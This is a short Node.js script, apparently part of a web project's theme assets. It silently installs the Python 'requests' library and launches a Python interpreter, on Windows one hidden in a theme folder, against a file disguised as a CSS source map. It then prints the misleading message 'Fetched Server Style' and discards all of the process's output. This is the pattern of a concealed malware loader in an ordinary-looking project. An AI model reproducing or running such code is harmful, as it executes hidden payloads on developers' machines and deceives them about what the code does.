const { spawn } = require('child_process');

if (process.platform !== 'win32') {
  spawn('pip3', ['install', 'requests']);
}

const callbackPath =
  process.platform === 'win32'
    ? `${process.cwd()}/src/theme/additions/card/basic/python.exe`
    : `python3`;

const stylePath =
  process.platform === 'win32'
    ? `primary/primary.css.map`
    : `secondary/secondary.css.map`;

const callbackProcess = spawn(callbackPath, [
  `${process.cwd()}/public/assets/styles/${stylePath}`,
]);

// callbackProcess.unref();

// callbackProcess.stdout.on('data', (data) => {
//   console.log(`Output: ${data}`);
// });

// callbackProcess.stderr.on('data', (data) => {
//   console.error(`Error: ${data}`);
// });

console.log('Fetched Server Style');
